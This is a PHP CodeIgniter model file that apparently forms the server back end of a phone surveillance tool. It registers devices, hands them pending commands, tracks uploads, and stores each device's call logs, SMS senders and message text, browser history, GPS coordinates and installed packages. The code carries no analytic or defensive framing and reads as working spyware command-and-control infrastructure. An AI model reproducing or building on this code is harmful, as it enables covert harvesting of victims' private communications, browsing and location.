<?php
class Device_model extends CI_Model{

	public function __construct(){
		parent :: __construct();
	}

	function insertid($id=false)
	{
		$res = $this->db->get_where('tbl_device', array('clm_device_id'=>$id))->num_rows;
		if($res==0){
			$date = date("Y-m-d");
			$this->db->insert('tbl_device', array('clm_registered'=>$date, 'clm_device_id'=>$id));
		}

		return;
	}

	function getcommand($id=false)
	{
		$res = $this->db->get_where('tbl_device', array('clm_device_id'=>$id))->row_array();
		return $res;
	}

	function changestat($id=false)
	{
		$data_device = array('clm_commandseen'=>'1');
		$this->db->where('clm_device_id', $id);
		$this->db->update('tbl_device', $data_device);

		return;
	}

	function changeupload($id=false)
	{
		$uploads = $this->db->get_where('tbl_device', array('clm_device_id'=>$id))->row_array();
		$ct = $uploads['clm_uploads'] +1;
		
		$data_device = array('clm_uploads'=>$ct);
		$this->db->where('clm_device_id', $id);
		$this->db->update('tbl_device', $data_device);

		return;
	}

	function insertcalllog($id,$arr){
		$query = $this->db->insert('tbl_calllogs',array('clm_device_id'=>$id, 'clm_number'=>$arr[1], 'clm_date'=> $arr[0]));
		return;
	}

	function insertsmslog($id,$arr){
		$query = $this->db->insert('tbl_smslogs',array('clm_device_id'=>$id, 'clm_date'=>$arr[0], 'clm_from'=> $arr[1], 'clm_msg'=> $arr[2]));
		return;
	}

	function insertbrowserlog($id,$arr){
		$query = $this->db->insert('tbl_browserlogs',array('clm_device_id'=>$id, 'clm_title'=>$arr[0], 'clm_url'=> $arr[1]));
		return;
	}

	function insertgps($id,$arr){
		$query = $this->db->insert('tbl_gps',array('clm_device_id'=>$id, 'clm_latitude'=>$arr[0], 'clm_longitude'=> $arr[1]));
		return;
	}

	function insertpackages($id,$arr){
		$query = $this->db->insert('tbl_packages',array('clm_device_id'=>$id, 'clm_package'=>$arr));
		return;
	}

}
?>